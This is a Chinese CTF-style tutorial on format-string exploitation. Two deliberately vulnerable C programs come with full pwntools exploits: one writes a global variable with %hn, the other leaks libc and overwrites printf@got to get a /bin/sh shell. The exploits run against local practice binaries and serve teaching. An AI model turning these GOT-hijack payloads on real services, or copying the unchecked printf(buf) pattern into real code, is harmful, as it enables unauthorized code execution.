---
title: "03.1 格式化字符串经典例题"
description: "通过两道实测例题演示格式化字符串的偏移定位、大小序分段写入，以及泄露 libc 并改写 GOT 表获取 Shell 的完整流程。"
categories: [Pwn笔记, 第03章 格式化字符串]
tags: [format-string, got-hijack, pwntools]
---

本文结合两道经典题型，串起 [03.0 格式化字符串漏洞概述](/posts/format-string/) 中的偏移定位、大小序分段写、`%k$s` 任意读和 `fmtstr_payload` 改写 GOT 表。两道题均在 Ubuntu x86-64 下实测编译打通。

## 例题一：改写全局变量触发后门

### 题目源码与保护

```c
#include <stdio.h>
#include <unistd.h>

int magic = 0;

void win(void)
{
    puts("flag{fmt_str_write_success}");
}

void vuln(void)
{
    char buf[128];
    ssize_t n = read(0, buf, sizeof(buf) - 1);
    if (n <= 0)
    {
        return;
    }
    buf[n] = '\0';
    printf(buf);
    if (magic == 0x1337beef)
    {
        win();
    }
    else
    {
        printf("\nmagic = 0x%x\n", magic);
    }
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

编译为关闭 PIE 的 64 位程序：

```bash
gcc -no-pie -fno-stack-protector -Wno-format-security chal1.c -o chal1
```

反编译伪代码：

```c
int vuln()
{
  ssize_t v0; // rax
  char buf[136]; // [rsp+0h] [rbp-90h] BYREF
  ssize_t v3; // [rsp+88h] [rbp-8h]

  v0 = read(fd: 0, buf, nbytes: 0x7Fu);
  v3 = v0;
  if ( v0 > 0 )
  {
    buf[v3] = 0;
    printf(format: buf);
    if ( magic == 322420463 )
      LODWORD(v0) = win();
    else
      LODWORD(v0) = printf(format: "\nmagic = 0x%x\n", magic);
  }
  return v0;
}
```

目标 `magic` 位于 `0x40403c`，要求改写为 `0x1337beef`（`322420463`），程序只有一次 `printf(buf)` 触发机会。

### 分析与偏移计算

1. **确定起始偏移 `k`**：伪代码中 `buf` 的栈偏移为 `[rsp+0h]`，离栈顶距离为 0，直接算出 `k = 6 + 0 / 8 = 6`。输入 `AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p` 实测验证：

```text
AAAAAAAA.0x7ffc21aeba90.0x7ffc21aeba90.0x7b248951bcf1.(nil).0x7b2489699380.0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70
```

第 6 项输出 `0x4141414141414141`，与 `k = 6` 一致。

2. **按数值从小到大拆段**：`0x1337beef` 的低 2 字节（`0xbeef = 48879`）大于高 2 字节（`0x1337 = 4919`）。由于 `printf` 内部输出计数器只能递增，先写数值较小的高 2 字节，再补差值写低 2 字节：

- 第 1 段写高 2 字节（`magic + 2 = 0x40403e`）：用 `%4919c` 把累计输出推到 `4919`，再用 `%hn` 写入 `0x1337`；
- 第 2 段写低 2 字节（`magic = 0x40403c`）：差值 `48879 - 4919 = 43960`，用 `%43960c` 把计数推到 `48879`，再用 `%hn` 写入 `0xbeef`。

3. **对齐与槽位分配**：控制前缀 `%4919c%10$hn%43960c%11$hn` 长 25 字节，向 8 字节边界补 7 个 `'A'` 凑满 32 字节（占掉 `%6$`~`%9$` 共 `m = 4` 个槽位），末尾接的两个地址正好落在 `%10$` 和 `%11$`：

```text
buf[0..31]  (%6$ ~ %9$): "%4919c%10$hn%43960c%11$hnAAAAAAA"  (25 + 7 = 32 字节)
buf[32..39] (%10$):      p64(0x40403e)
buf[40..47] (%11$):      p64(0x40403c)
```

### 完整 exp

```python
from pwn import *

elf = ELF("./chal1")
context.binary = elf
io = process("./chal1")

magic = elf.sym["magic"]
payload = b"%4919c%10$hn%43960c%11$hn".ljust(32, b"A") + p64(magic + 2) + p64(magic)
io.send(payload)
print(io.recvall().decode(errors="ignore"))
```

运行后程序输出大量空格并触发 `win()`，打印出 `flag{fmt_str_write_success}`。

---

## 例题二：泄露 libc 并改写 GOT 表拿 Shell

### 题目源码与保护

```c
#include <stdio.h>
#include <unistd.h>

void vuln(void)
{
    char buf[128];
    while (1)
    {
        ssize_t n = read(0, buf, sizeof(buf) - 1);
        if (n <= 0)
        {
            break;
        }
        buf[n] = '\0';
        printf(buf);
    }
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    puts("Welcome:");
    vuln();
    return 0;
}
```

编译为 Partial RELRO、关闭 PIE 的 64 位程序：

```bash
gcc -no-pie -Wl,-z,relro -Wno-format-security chal2.c -o chal2
```

反编译伪代码：

```c
unsigned __int64 vuln()
{
  ssize_t v1; // [rsp+8h] [rbp-98h]
  char buf[136]; // [rsp+10h] [rbp-90h] BYREF
  unsigned __int64 v3; // [rsp+98h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  while ( 1 )
  {
    v1 = read(fd: 0, buf, nbytes: 0x7Fu);
    if ( v1 <= 0 )
      break;
    buf[v1] = 0;
    printf(format: buf);
  }
  return v3 - __readfsqword(0x28u);
}
```

程序开启 Partial RELRO、关闭 PIE，GOT 表可写；`vuln()` 为无限循环且每次最多读入 127 字节。

### 分析与利用步骤

1. **确定偏移 `k`（探路）**：伪代码中 `buf` 位于 `[rsp+10h]`（前面 `0x10` 字节被局部变量 `v1` 与栈对齐占用），按公式算得 `k = 6 + 0x10 / 8 = 8`。先发一轮 `AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p` 探路实测：

```text
AAAAAAAA.0x7ffe3d5462e0.0x7ffe3d5462e0.0x7f917371bcf1.0x8.0x7f91738af380.0xa.0x20.0x4141414141414141
```

`0x4141414141414141` 落在第 8 位，确认 `k = 8`。偏移测出来之后，后面的 exp 直接用 `8` 即可，不用每次运行都重新探一遍。

2. **第 1 轮：泄露 `puts@got` 计算基址**：`main()` 开头调用过 `puts("Welcome:")`，`puts@got` 已经完成延迟绑定。构造 `"%9$sEND_"`（刚好占满 8 字节的 `%8$` 槽位）后接 `p64(puts_got)`（落入 `%9$`）；追加 `END_` 作为定界标记，用来截断末尾地址中自带的可见字符干扰，取出 6 字节真实地址后即可算出 `libc_base` 和 `system`。

3. **第 2 轮：改写 `printf@got` 为 `system`**：使用 `fmtstr_payload(8, {printf_got: system}, write_size="short")`（或者自己按 2 字节拆段手写）。这里若用默认的 `write_size="byte"`，写一个 64 位地址最多会拆出 6\~8 条 `%hhn` 并附带等量地址，很容易超出 127 字节的 `read` 上限；改用 `"short"` 按 2 字节拆成 3 段后，总长度可以稳稳控制在限制内。

4. **第 3 轮：清理缓冲并触发 Shell**：第 2 轮写入过程会打印大量空格填充，发送前需先等输出落盘并调用 `io.clean()` 清空接收区，再发送 `"/bin/sh\x00"`，下一次执行 `printf(buf)` 即跳转为 `system("/bin/sh")`。

### 完整 exp

#### 版本一：使用 `fmtstr_payload`

```python
from pwn import *

elf = ELF("./chal2")
context.binary = elf
libc = elf.libc          # 本地用系统 libc；远程换成题目附件里的 libc.so.6
io = process("./chal2")

puts_got = elf.got["puts"]
printf_got = elf.got["printf"]

io.recvuntil(b"Welcome:\n")
io.send(b"%9$sEND_" + p64(puts_got))
d = io.recvuntil(b"END_", drop=True)
assert len(d) == 6, (len(d), d)
leak = u64(d.ljust(8, b"\x00"))

libc.address = leak - libc.sym["puts"]
assert libc.address & 0xfff == 0, hex(libc.address)
log.info(f"puts = {leak:#x}, libc base = {libc.address:#x}")

payload2 = fmtstr_payload(8, {printf_got: libc.sym["system"]}, write_size="short")
assert len(payload2) <= 127, len(payload2)
io.send(payload2)

sleep(0.2)
io.clean()
io.send(b"/bin/sh\x00")
io.interactive()
```

#### 版本二：不用 `fmtstr_payload`（手写 payload）

`fmtstr_payload` 生成的就是这套按值排序、分段写入的格式串。自己手写抓住两点就行：地址放在末尾（`0x404010` 带 `\x00`，放开头会被 `printf` 当作字符串结束符截断），格式串前缀固定补成 8 的倍数，这样末尾地址的参数编号就能提前算死。

这里 `fix = 0x30` 让格式串固定占 48 字节（占掉 `%8$`\~`%13$`），末尾 3 个地址从 `buf[48]` 开始，对应 `%14$`\~`%16$`。只写低 6 字节就够：`printf@got` 原来存的是 libc 地址，高 2 字节本来就是 `\x00`。同一次运行里，`fmtstr_payload` 生成 64 字节，手写版生成 72 字节，都能压进 127 字节上限。

```python
from pwn import *


def fmt_write(addr, value, nbytes=6, fix=0x30, base=8):
    chunks = [(value >> (8 * i)) & 0xffff for i in range(0, nbytes, 2)]
    order = sorted(range(len(chunks)), key=lambda i: chunks[i])   # 按值升序，少打填充

    specs, cur = b"", 0
    for n, i in enumerate(order):
        pad = (chunks[i] - cur) & 0xffff
        if pad:
            specs += b"%" + str(pad).encode() + b"c"
        specs += b"%" + str(base + fix // 8 + n).encode() + b"$hn"
        cur = chunks[i]

    assert len(specs) <= fix, (len(specs), fix)
    specs = specs.ljust(fix, b"A")                                 # 补到固定长度
    addrs = b"".join(p64(addr + 2 * i) for i in order)
    return specs + addrs


elf = ELF("./chal2")
context.binary = elf
libc = elf.libc
io = process("./chal2")

puts_got = elf.got["puts"]
printf_got = elf.got["printf"]

io.recvuntil(b"Welcome:\n")
io.send(b"%9$sEND_" + p64(puts_got))
d = io.recvuntil(b"END_", drop=True)
assert len(d) == 6, (len(d), d)
leak = u64(d.ljust(8, b"\x00"))

libc.address = leak - libc.sym["puts"]
assert libc.address & 0xfff == 0, hex(libc.address)
log.info(f"puts = {leak:#x}, libc base = {libc.address:#x}")

payload2 = fmt_write(printf_got, libc.sym["system"])
assert len(payload2) <= 127, len(payload2)
io.send(payload2)

sleep(0.2)
io.clean()
io.send(b"/bin/sh\x00")
io.interactive()
```

两个版本本地跑通后 `echo PWNED` 和 `id` 都有回显，泄露长度为 6。

---

## 常见踩坑小结

- **先探偏移，别盲抄 `k`**：同一套代码多一个局部变量或换一种编译选项，`k` 就可能从 `6` 变成 `8`。拿到新题目先发一次 `AAAAAAAA.%p...` 确认 `k`，再把数值写进 exp；如果把探测写进脚本里自动解析，记得对回显 `strip()` 去掉末尾 `\n`，不然 `index("0x4141414141414141")` 会抛 `ValueError`。

- **`k+1` 超过 9 会破坏对齐**：`%10$sEND_` 是 9 字节，地址不再从 8 字节边界开始，直接写会指到半截地址。遇到两位数编号时把分隔符缩短（如 `%10$s_AA` 凑满 8 字节），或者把前缀补齐到 16 字节再顺延目标槽位，不能直接照抄 `%9$sEND_`。

- **libc 必须和题目一致**：本地用 `elf.libc`，远程换成附件里的 `libc.so.6`。算完 `libc.address` 先断言页对齐，不对就是版本拿错了，后面写 GOT 必崩。

- **泄露长度先断言**：`%s` 遇到目标地址里的 `\x00` 会提前截断，`len(d)` 不是 6 时 `u64` 出来的是错地址。真撞上了就换一个已经解析过的函数（如 `read@got`）再泄。

- **留意缓冲区长度上限**：`fmtstr_payload` 默认按 1 字节（`'byte'`）拆分，遇到 `buf` 只有 64\~128 字节的题目容易被截断，换成 `write_size="short"` 通常能压进限制内。

- **改写后等待缓冲清空再发下一轮**：第 2 轮写入 `printf@got` 会打印大量填充空格，先 `sleep` 配合 `io.clean()` 清掉多余输出再发 `"/bin/sh\x00"`，能避免下一轮 `read` 和输入流粘连错位。
